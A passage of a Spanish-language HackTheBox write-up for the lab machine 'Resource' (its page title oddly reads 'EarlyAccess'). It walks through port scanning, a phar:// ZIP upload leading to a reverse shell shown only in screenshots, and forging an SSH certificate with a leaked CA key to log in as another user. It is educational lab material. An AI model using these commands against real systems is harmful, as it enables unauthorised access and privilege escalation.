@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Writeup EarlyAccess</title>
+ <link rel="stylesheet" href="/assets/css/styles_machine.css" />
+ <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
+ <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
+ <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">    
+</head>
+<body>
+  <div class="menu">
+    <div id="mySidepanel" class="sidepanel">
+        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
+        <a href="/htb">HackTheBox</a>
+        <a href="/">Home</a>
+        <a href="https://mrpr1ngl3s.github.io/blog">Blog</a>
+    </div>
+    
+    <button class="openbtn" onclick="openNav()">☰</button>  
+</div>
+<script>
+function openNav() {
+if (window.innerWidth <= 1000) {
+    document.getElementById("mySidepanel").style.display = "block";
+} else {
+    document.getElementById("mySidepanel").style.width = "25%";
+}
+}
+
+function closeNav() {
+if (window.innerWidth <= 1000) {
+    document.getElementById("mySidepanel").style.display = "none";
+} else {
+    document.getElementById("mySidepanel").style.width = "0";
+}
+
+}
+
+</script>
+
+  <div class="main">
+    <a href="https://app.hackthebox.com/machines/Resource/"  target="_blank"><img style="float: right; margin-left:60px; height:90px;" src="/img/Resource.png"/></a>
+
+
+<h1 id="resource">Resource</h1>
+<h2 id="enumeración">Enumeración</h2>
+<p>Iniciamos con la máquina comprobando la conectividad realizando un <strong>ping</strong> a la IP <strong>10.10.11.27</strong>.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a>❯ <span class="fu">ping</span> -c 1 10.10.11.27</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="ex">PING</span> 10.10.11.27 (10.10.11.27) <span class="ex">56</span>(84) <span class="ex">bytes</span> of data.</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="ex">64</span> bytes from 10.10.11.27: icmp_seq=1 ttl=63 time=95.7 ms</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="ex">---</span> 10.10.11.27 ping statistics ---</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a><span class="ex">1</span> packets transmitted, 1 received, 0% packet loss, time 0ms</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a><span class="ex">rtt</span> min/avg/max/mdev = 95.718/95.718/95.718/0.000 ms</span></code></pre></div>
+<p>En el output del comando ejecutado en el parámetro <strong>ttl</strong> se ve que el valor está más cerca del <strong>64</strong> que del <strong>128</strong>, gracias a este parámetro se puede saber el sistema operativo que se está utilizando, en este caso un Linux.</p>
+<table>
+<thead>
+<tr class="header">
+<th>TTL</th>
+<th>OS</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>64</td>
+<td>GNU/Linux</td>
+</tr>
+<tr class="even">
+<td>128</td>
+<td>Windows</td>
+</tr>
+</tbody>
+</table>
+<p>Vamos a utilizar la herramienta <strong>Nmap</strong> para escanear los puertos que estén abiertos y servicios que están asociados a estos.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a>❯ <span class="fu">nmap</span> -p- --open -sCV -n --min-rate 5000 -Pn 10.10.11.27 -oN Scan</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 8%" />
+<col style="width: 91%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-p-</td>
+<td>Indica que analice todos los puertos del 1 al 65535</td>
+</tr>
+<tr class="even">
+<td>–open</td>
+<td>Únicamente se escanearan los puertos que estén abiertos</td>
+</tr>
+<tr class="odd">
+<td>-sC</td>
+<td>Lanza scripts que tiene Nmap por defecto para detectar el tipo de servicio que este corriendo en un puerto</td>
+</tr>
+<tr class="even">
+<td>-sV</td>
+<td>Lanza scripts que tiene Nmap para saber que versión están utilizando los servicios</td>
+</tr>
+<tr class="odd">
+<td>-n</td>
+<td>Se evita realizar resolución DNS</td>
+</tr>
+<tr class="even">
+<td>–min-rate</td>
+<td>Indica la cantidad de paquetes que se envían por segundo, en este caso 5000</td>
+</tr>
+<tr class="odd">
+<td>-Pn</td>
+<td>Deshabilita la búsqueda del host, solamente manda los paquetes a los puertos.</td>
+</tr>
+<tr class="even">
+<td>-oN</td>
+<td>Exporta el output del comando ejecutado a un archivo en formato nmap</td>
+</tr>
+</tbody>
+</table>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="ex">Starting</span> Nmap 7.93 ( https://nmap.org ) <span class="ex">at</span> 2025-02-08 09:02 CET</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 10.10.11.27</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a><span class="ex">Host</span> is up (0.099s latency)<span class="ex">.</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a><span class="ex">Not</span> shown: 65204 closed tcp ports (reset), <span class="ex">328</span> filtered tcp ports (no-response)</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a><span class="ex">Some</span> closed ports may be reported as filtered due to --defeat-rst-ratelimit</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a><span class="ex">PORT</span>     STATE SERVICE VERSION</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true"></a><span class="ex">22/tcp</span>   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">ssh-hostkey</span>: </span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">256</span> 781e3b851264a1f6df5241ad8f5297c0 (ECDSA)</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  256 e11ab50e87a4a18169949dd4d4a38af9 (ED25519)</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true"></a><span class="ex">80/tcp</span>   open  http    nginx 1.18.0 (Ubuntu)</span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-title</span>: Did not follow redirect to http://itrc.ssg.htb/</span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-server-header</span>: nginx/1.18.0 (Ubuntu)</span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true"></a><span class="ex">2222/tcp</span> open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0)</span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">ssh-hostkey</span>: </span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">256</span> f2a683b9906b6c543222ecaf1704bd16 (ECDSA)</span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  256 0cc39c10f57fd3e4a8286a51ad1ae1bf (ED25519)</span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true"></a><span class="ex">Service</span> Info: OS: Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true"></a></span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true"></a><span class="ex">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true"></a><span class="ex">Nmap</span> done: 1 IP address (1 host up) <span class="ex">scanned</span> in 23.90 seconds</span></code></pre></div>
+<p>Los puertos que se han descubierto son:</p>
+<table>
+<thead>
+<tr class="header">
+<th>Puertos</th>
+<th>Servicio</th>
+<th>Versión</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 9.2p1</td>
+</tr>
+<tr class="even">
+<td>80</td>
+<td>HTTP</td>
+<td>nginx 1.18.0</td>
+</tr>
+<tr class="odd">
+<td>2222</td>
+<td>SSH</td>
+<td>OpenSSH 8.9p1</td>
+</tr>
+</tbody>
+</table>
+<p>Si nos fijamos, podemos observar que el dominio es <strong>itrc.ssg.htb</strong>. Por ello, si intentamos acceder directamente, no será posible resolverlo, ya que primero debemos indicarle al sistema que dicho dominio está asociado a la dirección IP <strong>10.10.11.27</strong>, agregándolo en el archivo <strong>/etc/hosts</strong>.</p>
+<p><img src="Img/Pasted image 20250208110446.png"></p>
+<p>Al acceder ahora sí a la página, podemos observar que tenemos la posibilidad de registrarnos e iniciar sesión.</p>
+<p><img src="Img/Pasted image 20250208110751.png"></p>
+<p><img src="Img/Pasted image 20250208110805.png"></p>
+<p><img src="Img/Pasted image 20250208111049.png"></p>
+<p>Nos creamos una cuenta, y accedemos</p>
+<p><img src="Img/Pasted image 20250208112827.png"></p>
+<p>Al acceder, nos muestra un apartado donde podemos crear tickets.</p>
+<p><img src="Img/Pasted image 20250208112905.png"></p>
+<p>Si observamos, podemos ver que tenemos la posibilidad de subir archivos <strong>.zip</strong> .</p>
+<p><img src="Img/Pasted image 20250208114311.png"></p>
+<p>Creamos uno que contenga un archivo <strong>.php</strong> .</p>
+<p><img src="Img/Pasted image 20250208120635.png"></p>
+<p>Lo subimos</p>
+<p><img src="Img/Pasted image 20250208121759.png"></p>
+<p>Y al acceder no vemos nada</p>
+<p><img src="Img/Pasted image 20250208121824.png"></p>
+<p>Pero si nos fijamos en el código fuente, podemos observar la ruta donde es guardado el archivo.</p>
+<p><img src="Img/Pasted image 20250208121901.png"></p>
+<p>Al intentar acceder nos intenta descargar el archivo .zip</p>
+<p><img src="Img/Pasted image 20250208124400.png"></p>
+<p>Utilizando el wrapper <strong>phar://</strong> que permite acceder a archivos dentro de archivo <strong>.phar</strong> (archivos PHP), pero también a otros archivos comprimidos como por ejemplo los archivos <strong>.zip</strong>, podemos ver el contenido de nuestro archivo PHP.</p>
+<p><img src="Img/Pasted image 20250208170110.png"></p>
+<p>Sabiendo esto, crearemos un archivo PHP el cual envíe una <strong>Reverse Shell</strong> a nuestro equipo.</p>
+<p><img src="Img/Pasted image 20250208172103.png"></p>
+<p><img src="Img/Pasted image 20250208172343.png"></p>
+<p><img src="Img/Pasted image 20250208172351.png"></p>
+<p>Si miramos los archivos que hay en el directorio <strong>uploads</strong>, podemos observar, que hay un comprimido <strong>.zip</strong> que llama mucho la atención, y es que tiene un mayor tamaño que los demás.</p>
+<p><img src="Img/Pasted image 20250208183019.png"></p>
+<p>Nos lo enviamos a nuestra maquina para poder operar de forma mas cómoda.</p>
+<p><img src="Img/Pasted image 20250208183604.png"></p>
+<p>Y podemos observar que dentro contiene un archivo</p>
+<p><img src="Img/Pasted image 20250208183648.png"></p>
+<p><img src="Img/Pasted image 20250208183629.png"></p>
+<p>Al mirar dentro del archivo, podemos ver unas credenciales.</p>
+<p><img src="Img/Pasted image 20250208183844.png"></p>
+<p>Si tratamos de acceder vía <strong>SSH</strong> con las credenciales encontradas si nos deja acceder, pero si nos fijamos vemos que estamos dentro de un contenedor.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a>❯ <span class="fu">ssh</span> msainristil@10.10.11.27</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a><span class="ex">msainristil@10.10.11.27</span><span class="st">&#39;s password: </span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true"></a><span class="st">Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true"></a></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true"></a><span class="st">The programs included with the Debian GNU/Linux system are free software;</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true"></a><span class="st">the exact distribution terms for each program are described in the</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true"></a><span class="st">individual files in /usr/share/doc/*/copyright.</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true"></a></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true"></a><span class="st">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true"></a><span class="st">permitted by applicable law.</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true"></a><span class="st">Last login: Sat Feb  8 17:40:57 2025 from 10.10.14.11</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true"></a><span class="st">msainristil@itrc:~$ </span></span></code></pre></div>
+<p>Vemos que hay un usuario con nombre <strong>zzinter</strong> .</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ grep sh$ /etc/passwd </span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a><span class="ex">root</span>:x:0:0:root:/root:/bin/bash</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a><span class="ex">msainristil</span>:x:1000:1000::/home/msainristil:/bin/bash</span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a><span class="ex">zzinter</span>:x:1001:1001::/home/zzinter:/bin/bash</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ </span></code></pre></div>
+<p>Si miramos en nuestro directorio de trabajo, podemos observar que tenemos un directorio el cual contiene 2 claves, una privada y una publica de una entidad certificadora <strong>CA</strong> .</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ ls -la                     </span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="ex">total</span> 36</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="ex">drwx------</span> 1 msainristil msainristil 4096 Feb  8 19:20 .</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span> 1 root        root        4096 Aug 13 11:13 ..</span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a><span class="ex">lrwxrwxrwx</span> 1 root        root           9 Aug 13 11:13 .bash_history -<span class="op">&gt;</span> /dev/null</span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 msainristil msainristil  220 Mar 29  2024 .bash_logout</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 msainristil msainristil 3526 Mar 29  2024 .bashrc</span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 msainristil msainristil  807 Mar 29  2024 .profile</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true"></a><span class="ex">drwx------</span> 2 msainristil msainristil 4096 Feb  8 19:20 .ssh</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span> 1 msainristil msainristil 4096 Jan 24  2024 decommission_old_ca</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ </span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ ls -l decommission_old_ca/</span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true"></a><span class="ex">total</span> 8</span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true"></a><span class="ex">-rw-------</span> 1 msainristil msainristil 2602 Jan 24  2024 ca-itrc</span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 msainristil msainristil  572 Jan 24  2024 ca-itrc.pub</span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$</span></code></pre></div>
+<p>En este <a class="link" href="https://superuser.com/questions/308126/is-it-possible-to-sign-a-file-using-an-ssh-key" target="_blank">post</a> podemos ver como firmar y autorizar claves cuando tenemos certificados.</p>
+<p>Generamos una clave privada y publica.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ ssh-keygen</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a><span class="ex">Generating</span> public/private rsa key pair.</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a><span class="ex">Enter</span> file in which to save the key (/home/msainristil/.ssh/id_rsa)<span class="bu">:</span> </span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true"></a><span class="ex">Created</span> directory <span class="st">&#39;/home/msainristil/.ssh&#39;</span>.</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true"></a><span class="ex">Enter</span> passphrase (empty for no passphrase)<span class="bu">:</span> </span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true"></a><span class="ex">Enter</span> same passphrase again: </span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true"></a><span class="ex">Your</span> identification has been saved in /home/msainristil/.ssh/id_rsa</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true"></a><span class="ex">Your</span> public key has been saved in /home/msainristil/.ssh/id_rsa.pub</span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true"></a><span class="ex">The</span> key fingerprint is:</span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true"></a><span class="ex">SHA256</span>:BuHoeX2O1dmgnzo10qJ+aje2G5wAoWJwpcrJl+39HMg msainristil@itrc</span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true"></a><span class="ex">The</span> key<span class="st">&#39;s randomart image is:</span></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true"></a><span class="st">+---[RSA 3072]----+</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true"></a><span class="st">|. ... o          |</span></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true"></a><span class="st">| o . + o         |</span></span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true"></a><span class="st">|  + o +     .    |</span></span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true"></a><span class="st">|oo.oo. +   o +   |</span></span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true"></a><span class="st">|.+ oo.. S +.o .  |</span></span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true"></a><span class="st">|  . ..o..Boo+.   |</span></span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true"></a><span class="st">|     . E.o=+o.   |</span></span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true"></a><span class="st">|        = Bo     |</span></span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true"></a><span class="st">|       ooB+=     |</span></span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true"></a><span class="st">+----[SHA256]-----+</span></span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true"></a><span class="st">msainristil@itrc:~$ ls -l .ssh/</span></span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true"></a><span class="st">total 8</span></span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true"></a><span class="st">-rw------- 1 msainristil msainristil 2602 Feb  8 19:20 id_rsa</span></span>
+<span id="cb7-26"><a href="#cb7-26" aria-hidden="true"></a><span class="st">-rw-r--r-- 1 msainristil msainristil  570 Feb  8 19:20 id_rsa.pub</span></span>
+<span id="cb7-27"><a href="#cb7-27" aria-hidden="true"></a><span class="st">msainristil@itrc:~$</span></span></code></pre></div>
+<p>Ahora generamos el <strong>certificado</strong> firmando la clave <strong>publica</strong> con la clave <strong>privada</strong> de la entidad certificadora a nombre del usuario zzinter.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ ssh-keygen -s decommission_old_ca/ca-itrc -n zzinter -I anything .ssh/id_rsa.pub </span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a><span class="ex">Signed</span> user key .ssh/id_rsa-cert.pub: id <span class="st">&quot;anything&quot;</span> serial 0 for zzinter valid forever</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ </span></code></pre></div>
+<table>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-s</td>
+<td>Indica la clave privada de la entidad certificadora</td>
+</tr>
+<tr class="even">
+<td>-n</td>
+<td>Especifica que el certificado es válido para el usuario indicado</td>
+</tr>
+<tr class="odd">
+<td>-I</td>
+<td>Puede contener cualquier string que queramos</td>
+</tr>
+</tbody>
+</table>
+<p>Si vemos el contenido del directorio <strong>.ssh</strong>, podemos ver que nos ha creado el certificado.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ ls -l .ssh/</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a><span class="ex">total</span> 12</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a><span class="ex">-rw-------</span> 1 msainristil msainristil 2602 Feb  8 19:20 id_rsa</span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 msainristil msainristil 2023 Feb  8 19:39 id_rsa-cert.pub</span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 msainristil msainristil  570 Feb  8 19:20 id_rsa.pub</span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ </span></code></pre></div>
+<p>Con el certificado ya creado, ya podemos acceder sin proporcionar ninguna contraseña, como el usuario <strong>zzinter</strong> .</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="ex">msainristil@itrc</span>:~$ ssh -o CertificateFile=.ssh/id_rsa-cert.pub -i .ssh/id_rsa zzinter@localhost</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a><span class="ex">Linux</span> itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a><span class="ex">The</span> programs included with the Debian GNU/Linux system are free software<span class="kw">;</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a><span class="ex">the</span> exact distribution terms for each program are described in the</span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true"></a><span class="ex">individual</span> files in /usr/share/doc/*/copyright.</span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true"></a></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true"></a><span class="ex">Debian</span> GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true"></a><span class="ex">permitted</span> by applicable law.</span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true"></a><span class="ex">Last</span> login: Sat Feb  8 19:53:14 2025 from 127.0.0.1</span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 24%" />
+<col style="width: 75%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-o CertificateFile</td>
+<td>Especifica el certificado SSH que fue firmado por la CA</td>
+</tr>
+<tr class="even">
+<td>-i</td>
+<td>Usa la clave privada correspondiente</td>
+</tr>
+</tbody>
+</table>
+<p>Podemos ver la primera flag.</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ cat user.txt </span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true"></a><span class="ex">399*****************************</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ </span></code></pre></div>
+<p>Si miramos el contenido del directorio de trabajo, vemos cierto archivo, que realiza el mismo procedimiento de firmar la clave publica con la clave privada.</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ ls -l </span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true"></a><span class="ex">total</span> 8</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true"></a><span class="ex">-rw-rw-r--</span> 1 root root    1193 Feb 19  2024 sign_key_api.sh</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true"></a><span class="ex">-rw-r-----</span> 1 root zzinter   33 Feb  8 10:13 user.txt</span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true"></a><span class="ex">zzinter@itrc</span>:~$ cat sign_key_api.sh </span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true"></a><span class="co">#!/bin/bash</span></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true"></a></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true"></a><span class="fu">usage ()</span> <span class="kw">{</span></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true"></a>    <span class="bu">echo</span> <span class="st">&quot;Usage: </span><span class="va">$0</span><span class="st"> &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt;&quot;</span></span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true"></a>    <span class="bu">exit</span> 1</span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true"></a><span class="kw">}</span></span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true"></a></span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true"></a><span class="kw">if</span><span class="bu"> [</span> <span class="st">&quot;</span><span class="va">$#</span><span class="st">&quot;</span> <span class="ot">-ne</span> 3<span class="bu"> ]</span>; <span class="kw">then</span></span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true"></a>    <span class="ex">usage</span></span>
+<span id="cb12-15"><a href="#cb12-15" aria-hidden="true"></a><span class="kw">fi</span></span>
+<span id="cb12-16"><a href="#cb12-16" aria-hidden="true"></a></span>
+<span id="cb12-17"><a href="#cb12-17" aria-hidden="true"></a><span class="va">public_key_file=</span><span class="st">&quot;</span><span class="va">$1</span><span class="st">&quot;</span></span>
+<span id="cb12-18"><a href="#cb12-18" aria-hidden="true"></a><span class="va">username=</span><span class="st">&quot;</span><span class="va">$2</span><span class="st">&quot;</span></span>
+<span id="cb12-19"><a href="#cb12-19" aria-hidden="true"></a><span class="va">principal_str=</span><span class="st">&quot;</span><span class="va">$3</span><span class="st">&quot;</span></span>
+<span id="cb12-20"><a href="#cb12-20" aria-hidden="true"></a></span>
+<span id="cb12-21"><a href="#cb12-21" aria-hidden="true"></a><span class="va">supported_principals=</span><span class="st">&quot;webserver,analytics,support,security&quot;</span></span>
+<span id="cb12-22"><a href="#cb12-22" aria-hidden="true"></a><span class="va">IFS=</span><span class="st">&#39;,&#39;</span> <span class="bu">read</span> -ra <span class="va">principal</span> <span class="op">&lt;&lt;&lt;</span> <span class="st">&quot;</span><span class="va">$principal_str</span><span class="st">&quot;</span></span>
+<span id="cb12-23"><a href="#cb12-23" aria-hidden="true"></a><span class="kw">for</span> <span class="ex">word</span> in <span class="st">&quot;</span><span class="va">${principal[@]}</span><span class="st">&quot;</span><span class="kw">;</span> <span class="kw">do</span></span>
+<span id="cb12-24"><a href="#cb12-24" aria-hidden="true"></a>    <span class="kw">if</span> ! <span class="bu">echo</span> <span class="st">&quot;</span><span class="va">$supported_principals</span><span class="st">&quot;</span> <span class="kw">|</span> <span class="fu">grep</span> -qw <span class="st">&quot;</span><span class="va">$word</span><span class="st">&quot;</span><span class="kw">;</span> <span class="kw">then</span></span>
